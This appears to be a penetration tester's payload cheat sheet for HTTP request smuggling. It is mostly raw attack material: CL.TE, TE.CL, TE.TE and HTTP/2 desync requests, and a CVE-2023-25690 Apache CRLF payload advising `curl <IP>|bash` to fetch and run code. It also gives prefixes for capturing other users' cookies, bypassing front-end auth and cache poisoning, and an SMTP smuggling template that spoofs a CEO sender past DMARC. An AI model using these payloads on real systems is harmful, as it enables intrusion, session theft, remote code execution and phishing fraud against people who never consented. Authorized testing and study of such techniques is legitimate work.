---
title: "Payloads: HTTP Request Smuggling"
type: payloads
tags: [payloads, smuggling, desync, web]
sources: []
date_created: 2026-06-17
date_updated: 2026-06-29
---

# Payloads: HTTP Request Smuggling

Desync probes + exploit prefixes. Confirm with a differential (Burp HTTP Request Smuggler / "send group in sequence on a single connection"), never timing alone. Routed via the `hunt-smuggling` skill. See [[http-request-smuggling]].

## CL.TE (front-end Content-Length, back-end Transfer-Encoding)
```http
POST / HTTP/1.1
Host: x
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
Back-end leaves `G` to prefix the next request -> `GPOST ...` (404 oracle).

## TE.CL (front-end TE, back-end CL)
```http
POST / HTTP/1.1
Host: x
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0

```

## TE.TE (obfuscate so one server ignores TE)
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:\tchunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
 Transfer-Encoding: chunked        (leading space)
X: X\nTransfer-Encoding: chunked
```

## HTTP/2 desync
```
H2.CL  : set content-length header in an H2 request that downgrades to H1
H2.TE  : smuggle transfer-encoding via H2 -> H1 downgrade
H2.0   : back-end ignores body
CRLF in an H2 header name/value -> request splitting:  foo: bar\r\nSmuggled: x
```

## CVE-2023-25690 (Apache mod_rewrite `[P]` proxy CRLF, reach an unrouted backend route)
Path-based, not body-based. `$1` captured by `RewriteRule ^/x/(.*) http://be/app?p=$1 [P]` is proxied unencoded, so `%0d%0a` in the path splits the upstream request. Smuggle a POST to an endpoint the proxy never exposes:
```
/x/a%20HTTP/1.1%0d%0aHost:be%0d%0a%0d%0aPOST%20/sink.php%20HTTP/1.1%0d%0aHost:be%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:N%0d%0a%0d%0a<body>
```
Rules: one real char before the first `%20` (capture cannot be empty); `%20` (space) ends the request line; `&`->`%26` in the body; CL = decoded body length; avoid `/` in the body (use `curl <IP>|bash` with the payload at web-root `index.html`). Affects Apache 2.4.0-2.4.55. Full recipe: [[http-request-smuggling]].

## Exploit prefixes (after desync confirmed)
```
# capture another user's request (steal cookies/headers) - store-and-reflect
POST /comment HTTP/1.1 ... body=  (victim's request appended here)
# bypass front-end auth/path controls
GPOST /admin ...
# cache-poison via smuggled response, or escalate reflected -> stored XSS
```

## Tooling
```bash
# Burp extension: "HTTP Request Smuggler" (Smuggle probe -> auto CL.TE/TE.CL/TE.TE/H2)
# CLI:
h2csmuggler -x https://target ...        # HTTP/2 cleartext (h2c) smuggling
```

## Real-world
CL.TE/TE.CL classics (PayPal, many CDNs); H2.CL/H2.TE and h2c smuggling (Kettle's research) hit Netflix/Imperva/F5; CDN+origin desync -> mass request capture and cache poisoning. Front-end/back-end split is the prerequisite.

## SMTP smuggling (email, not HTTP) - end-of-data desync, spoof SPF/DKIM/DMARC
Outbound vs inbound SMTP disagree on end-of-data; smuggle a 2nd message with a spoofed From that rides the carrier's passing auth. See [[smtp-smuggling]].
```
# inside the carrier DATA, inject a non-standard end-of-data, then a new transaction:
<LF>.<LF>
MAIL FROM:<ceo@trusted-bank.com>
RCPT TO:<victim@target.tld>
DATA
From: CEO <ceo@trusted-bank.com>
Subject: spoofed (passes DMARC via the carrier)
.
# end-of-data variants to try: <LF>.<LF>   <CR>.<CR>   <LF>.<CR><LF>   <CR><LF>.<CR>
```
